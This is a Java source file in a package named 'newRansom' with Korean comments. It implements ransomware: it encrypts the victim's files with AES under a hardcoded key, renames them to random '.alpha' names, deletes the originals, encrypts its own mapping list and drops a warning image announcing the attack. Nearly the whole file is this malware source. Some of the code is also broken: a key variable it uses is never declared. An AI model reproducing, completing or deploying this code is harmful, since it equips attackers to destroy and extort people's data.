package newRansom;

import java.awt.Desktop;
import java.awt.image.BufferedImage;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.URISyntaxException;
import java.net.URL;
import java.nio.file.Paths;
import java.security.InvalidKeyException;
import java.security.Key;
import java.security.KeyFactory;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.UUID;

import javax.crypto.Cipher;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.imageio.ImageIO;

public class Cip implements CipInterface {

	private static Key publicKey;
	private static Key privateKey;
	private static Key key;
	
	static String aesfilepath = System.getProperty("user.home")+File.separator+"Desktop"+File.separator;
	Random r = new Random();
	Integer i = r.nextInt();
	Map<String, String> list = new HashMap<String, String>();
	
//    private static final String KEY = "ZZHHYYTTUUHHGGRR";
//    private static final String IV = "AAACCCDDDYYUURRS";
    
	// 공개키 및 개인키 생성
	public void CreateKey() { 
		try {
			// 개인키
			String KEY = "123456789abcdefg";
			// 공개키
			// SecretKeySpec secretKeySpec = new SecretKeySpec(KEY.getBytes(), "RSA");
			
			this.key = secretKeySpec; 
			// 실행 되면 사용자의 뷰어로 보여줄 이미지 경로
			URL url=getClass().getClassLoader().getResource("img/美希.png");
//			File r = new File("美希.png");
			File r =Paths.get(url.toURI()).toFile();
		    Desktop dt = Desktop.getDesktop();
		    dt.open(r);
			
			

		} catch (Exception e) {
			e.printStackTrace();
		}
		
		
	}
	
	// 파일을 암호화 시킨 후 생성할 무작위 파일 이름 생성
	public static void CreateFile(String filepath, String filename, byte[] str) {
		new File(filepath + filename);
		OutputStream bw;
		try {
			bw =new FileOutputStream(filepath + filename);
			bw.write(str);
			bw.close();

		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	// 파일을 암호화 시킨 후의 리스트
	public void CreateListFile(String filepath) {
		// TODO Auto-generated method stub
		Cipher cipher;
		try {
			cipher = Cipher.getInstance("AES");
//			SecretKeySpec secretKeySpec = new SecretKeySpec(key.getBytes(),"AES");
			cipher.init(Cipher.ENCRYPT_MODE, key);

			BufferedWriter bw;

			bw = new BufferedWriter(new FileWriter(new File(filepath + "list")));

			for (String key : list.keySet()) {
				bw.write(key);
				bw.newLine(); 
				bw.write(list.get(key));
				bw.newLine();
			}
			bw.close(); 
		} 

		catch (NoSuchAlgorithmException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		} catch (NoSuchPaddingException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		} catch (InvalidKeyException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
	// 경고 메세지를 알려주기 위한 부분
	public boolean CreateReadFile(String filepath, String filename) {
//		BufferedWriter bw;
		File f= new File(filepath + filename);
//		URL url=getClass().getClassLoader().getResource("warning.jpg");
		URL url=getClass().getClassLoader().getResource("img/warning.jpg");
		File warning = new File(filepath+File.separator+"warning.jpg");
		File r=null;
		if(warning.isFile()) {
			return false;
			
		}
		try {

			try {
				r =Paths.get(url.toURI()).toFile();
			} catch (URISyntaxException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			// 랜섬웨어 당했음을 알려주기 위한 메세지
		  	FileWriter fis = new FileWriter(warning);
		  	File origin_name = new File("warning.jpg");
		  	BufferedImage buffer_original_image = ImageIO.read(r);
		  	ImageIO.write(buffer_original_image, "jpg",warning);
//			bw.write("당신의 파일은 랜섬웨어에 의해 암호화 되었습니다.");
//			bw.newLine();
		} catch (IOException e) {
			e.printStackTrace();
		}
		return true;
	}

	// 파일 암호화 하는 부분
	public void FileEncrypt(String filepath, String filename) {
		// TODO Auto-generated method stub
		try {
			// AES/ECB 방식으로 암호화
			// Java는 PKCS5, PKCS7를 구분하지 않는다.
			Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");

			// 어떤 형식으로 암호화 시킬 것인지, 키가 무엇인지 저장한다.
			cipher.init(Cipher.ENCRYPT_MODE, key);
		
			String inFile = filepath + filename;
			// 암호화 된 파일을 무작위 이름으로 확장자는 alpha라는 이름으로 저장한다.
			String outFilename = CreateFileName(filepath, filename) + ".alpha";
		
			File f = new File(inFile);
		
			if(!f.isFile()) return;
			
			// 리스트에 원본 파일이 어떤 파일이름들로 암호화 시켰는지 기록한다/
			FileOutputStream out = new FileOutputStream(filepath + outFilename);
			
			byte[] buffer = new byte[1024];
            int read = -1;
            
            InputStream input = new BufferedInputStream(new FileInputStream(f));
            OutputStream output = new BufferedOutputStream(out);
            try {
				// 1024바이트씩 암호화 시킨다.
            	while ((read = input.read(buffer)) != -1) {
            		output.write(cipher.update(buffer, 0, read));
            	}
				// 남은 바이트도 암호화 시킨다.
            	output.write(cipher.doFinal());
            } finally {
            	if (output != null) {
            		try {
            			output.close();
            		} catch (IOException ie) {}
            	}
            	if (input != null) {
            		try {
            			input.close();
            		} catch (IOException ie) {
            		}
            	}
            }
            // 암호화 끝난 후 원본 파일 삭제
            if (f.delete())
				System.out.println("삭제완료1");
			else
				System.out.println("삭제실패1");
		} 
		catch (Exception e) {
			e.printStackTrace();
		}
	}

	// 무작위 파일 이름을 생성한다.
	private String CreateFileName(String filepath, String filename) {
		// TODO Auto-generated method stub
		String uniqueFileName = getUniqueFileName();
		boolean flag = doCheckFileExists(filepath + uniqueFileName + ".alpha");
		while (flag) {
			uniqueFileName = getUniqueFileName();
			flag = doCheckFileExists(filepath + uniqueFileName + ".alpha");
		}
		list.put(uniqueFileName, filename);
		return uniqueFileName;
	}

	// 파일이 존재하는지 확인
	private boolean doCheckFileExists(String fullPath) {
		// TODO Auto-generated method stub
		return new File(fullPath).exists();
	}

	// 무작위 파일 이름을 생성한다.
	private String getUniqueFileName() {
		// TODO Auto-generated method stub
		return UUID.randomUUID().toString();
	}

	// 파일 복호화
	public void FileDecryte(String filepath, String filename) {
		
		Cipher cipher;
		try {
			// AES/ECB 형식으로 복호화 시킨다.
			cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
			cipher.init(Cipher.DECRYPT_MODE, key);

			String inFile = filepath + filename;
			String outFilename = filename;
			File f = new File(inFile);
			
			// 리스트에서 암호화 시킨 파일들 리스트를 가져오고 확장자를 떼낸다.
			outFilename = list.get(outFilename.substring(0, (outFilename.length() - 6)));

			int pos = outFilename.lastIndexOf("."); 
			String ext = outFilename.substring(pos + 1);

			// 1024바이트씩 암호화 시켰으니 1024바이트씩 다시 복호화 시킨다.
			byte[] buffer = new byte[1024];
			int read = -1;
			
			File of = new File(filepath+outFilename);
			InputStream input = new BufferedInputStream(new FileInputStream(f));
			OutputStream output = new BufferedOutputStream(new FileOutputStream(of));
            
			// 파일을 복호화 시키는 부분
			try {
                	while ((read = input.read(buffer)) != -1) {
                		output.write(cipher.update(buffer, 0, read));
                	}
                	output.write(cipher.doFinal());
            } finally {
            	if (output != null) {
            		try {
            			output.close();
            		} catch (IOException ie) {}
            	}
            	if (input != null) {
            		try {
            			input.close();
            		} catch (IOException ie) {
            		}
            	}
            }
            
            input.close();
			output.close();

			// 복호화 시킨 다음에는 암호화 되었던 파일들을 삭제한다.
			f.delete();

			return;
		} catch (InvalidKeyException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (NoSuchAlgorithmException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (NoSuchPaddingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
	}

	public Map<String, String> ReturnList() {
		// TODO Auto-generated method stub
		return list;
	}

	// 저장된 리스트 파일로부터 키 값을 읽어온다.
	public void ReadListFile(String filepath) {
		// TODO Auto-generated method stub
		try {
			BufferedReader bw;

			bw = new BufferedReader(new FileReader(new File(filepath + "list")));
			Map<String,String> newlist = new HashMap<String,String>();
			String key = null;
			String value=null;

			while((key = bw.readLine())!=null) {
				value = (bw.readLine());

				newlist.put(key,value);
			}
			list = newlist;
			for (String ke : newlist.keySet()) {
//				System.out.println(ke+"    "+newlist.get(ke));
			}
			bw.close(); 
		}
		catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	// 암호화가 끝났으면 리스트 파일도 암호화 시킨다.
	public void ListEncrypt(String filepath, String filename) {
		// TODO Auto-generated method stub
		try {

//			byte[] bytesOfKey = key.getBytes("UTF-8");				
//			MessageDigest md = MessageDigest.getInstance("MD5");
//			byte[] keyBytes = md.digest(bytesOfKey);
//		
//	        
//			final byte[] ivBytes = IV.getBytes();
//
//	        SecretKeySpec secretKeySpec = new SecretKeySpec(keyBytes, "AES");
	        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
	        cipher.init(Cipher.ENCRYPT_MODE, key);

			String inFile = filepath + filename;
			String outFilename = filename + ".alpha";

			
			File f = new File(inFile);
			
			FileInputStream in = new FileInputStream(inFile);
			FileOutputStream out = new FileOutputStream(filepath + outFilename);
			
			// 16 바이트씩 암호화
			byte[] buffer = new byte[16];
            int read = -1;
            
            InputStream input = new BufferedInputStream(new FileInputStream(f));
            OutputStream output = new BufferedOutputStream(out);
            
            try {
            	while ((read = input.read(buffer)) != -1) {
            		output.write(cipher.update(buffer, 0, read));
            	}
            	output.write(cipher.doFinal());
            } finally {
            	if (output != null) {
            		try {
            			output.close();
            		} catch (IOException ie) {}
            	}
            	if (input != null) {
            		try {
            			input.close();
            		} catch (IOException ie) {
            		}
            	}
            }
            
			out.close();
			in.close();
					
			if (f.delete())
				System.out.println("삭제완료2");
			else
				System.out.println("삭제실패");
					

		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	// 복호화 시킬때 리스트를 읽어오기 위해 리스트를 복호화 시킨다.
	public void ListDecryte(String filepath, String filename) {
		// TODO Auto-generated method stub
		
		Cipher cipher;
		try {
//			byte[] bytesOfKey = key.getBytes("UTF-8");				
//			MessageDigest md = MessageDigest.getInstance("MD5");
//			byte[] keyBytes = md.digest(bytesOfKey);
//	        
//	        final byte[] kBytes = key.getBytes();
//
//	        final byte[] encryptedBytes;
//	        
//	        SecretKeySpec secretKeySpec = new SecretKeySpec(keyBytes, "AES");
//	        
//	        final byte[] ivBytes = IV.getBytes();
	        
	        cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
			cipher.init(Cipher.DECRYPT_MODE, key);
	        
			String inFile = filepath + filename;
			String outFilename = filename;

			outFilename = outFilename.substring(0, outFilename.length() - 6);

			String outFile = filepath + outFilename;

			
			byte[] buffer = new byte[16];
			int read = -1;
			
			
			File f = new File(inFile);
			
			
			FileInputStream in = new FileInputStream(inFile);
			FileOutputStream out = new FileOutputStream(filepath + outFilename);
			
			InputStream input = new BufferedInputStream(new FileInputStream(f));
            OutputStream output = new BufferedOutputStream(out);

            try {
            	while ((read = input.read(buffer)) != -1) {
            		output.write(cipher.update(buffer, 0, read));
            	}
            	output.write(cipher.doFinal());
            } finally {
            	if (output != null) {
            		try {
            			output.close();
            		} catch (IOException ie) {}
            	}
            	if (input != null) {
            		try {
            			input.close();
            		} catch (IOException ie) {
            		}
            	}
            }

            input.close();
			out.close();

			f.delete(); 


			return;
		} catch (InvalidKeyException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (NoSuchAlgorithmException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (NoSuchPaddingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
}
